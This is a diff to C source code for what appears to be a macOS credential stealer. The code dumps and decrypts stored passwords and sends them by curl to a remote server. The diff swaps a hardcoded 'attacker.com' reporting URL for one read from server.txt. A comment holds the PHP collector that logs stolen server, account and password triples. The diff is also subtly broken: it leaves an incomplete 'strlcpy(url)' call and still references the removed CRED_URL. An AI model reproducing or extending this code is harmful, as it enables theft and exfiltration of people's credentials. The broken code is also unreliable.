@@ -7,7 +7,8 @@
 #include <sys/sysctl.h>
 #include <curl/curl.h>
 
-#define CRED_URL "http://attacker.com/reportcredential.php"
+#define URL_MAX 2048
+
 /*
    <?php
    file_put_contents("creds.txt", $_POST['server'] . ' : ' . $_POST['account'] . ' : ' . $_POST['password'] . "\n",   $flags=FILE_APPEND);
@@ -431,11 +432,32 @@ void report_credential(t_credentials *, CURL *);
 // after all the data has been dumped and the passwords decrypted.
 void print_credentials() {
     if (!g_credentials) return;
+    size_t url_sz = URL_MAX+1;
+    char *url = NULL;
+    FILE *fp = NULL;
+    if ((fp = fopen("server.txt", "r")) == NULL)
+        return;
+    if ((url = malloc(url_sz)) == NULL) {
+        fclose(fp);
+        return;
+    }
+    fgets(url, url_sz, fp);
+    fclose(fp);
+    for (int i = strlen(url)-1; i > 1; --i)
+        if (url[i] == '\n') {
+            url[i] = 0;
+            if (url[i-1] == '\r')
+                url[i-1] = 0;
+            break;
+        }
     CURL *curl = NULL;
     if (!(curl = curl_easy_init())) {
         fprintf(stderr, "[!] Failed to initialize curl handle\n");
+        free(url);
         return;
     }
+
+    strlcpy(url)
     curl_easy_setopt(curl, CURLOPT_URL, CRED_URL);
     curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
     int i;
@@ -446,6 +468,7 @@ void print_credentials() {
         report_credential(cred, curl);
     }
     curl_easy_cleanup(curl);
+    free(url);
 }
 
 void report_credential(t_credentials *credentials, CURL *handle) {
